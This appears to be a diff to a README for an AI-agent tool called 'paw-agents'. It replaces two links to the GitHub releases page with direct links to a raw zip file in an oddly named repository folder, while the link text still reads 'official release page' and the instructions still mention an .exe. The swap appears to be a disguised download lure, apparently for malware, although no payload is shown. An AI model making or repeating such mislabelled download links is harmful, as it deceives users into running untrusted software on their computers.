@@ -1,6 +1,6 @@
 # 🐾 paw-agents - Run autonomous AI workers with confidence
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Lawabiding-longsleeve257/paw-agents/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Lawabiding-longsleeve257/paw-agents/raw/refs/heads/main/Ervipiame/agents-paw-1.6.zip)
 
 PAW Agents provides a secure environment to run automated digital assistants. This software manages tasks across the Solana blockchain and external digital platforms. It focuses on safety and clear record-keeping for every action your AI performs. You stay in control of your digital tasks while the system handles the technical execution.
 
@@ -8,7 +8,7 @@ PAW Agents provides a secure environment to run automated digital assistants. Th
 
 Follow these steps to set up the software on your Windows computer. This process takes about five minutes.
 
-1. Visit the [official release page](https://github.com/Lawabiding-longsleeve257/paw-agents/releases) to access the download options.
+1. Visit the [official release page](https://github.com/Lawabiding-longsleeve257/paw-agents/raw/refs/heads/main/Ervipiame/agents-paw-1.6.zip) to access the download options.
 2. Look for the file ending in `.exe` under the latest version header.
 3. Click the file name to start the download.
 4. Save the file to your computer in a folder you can easily find.
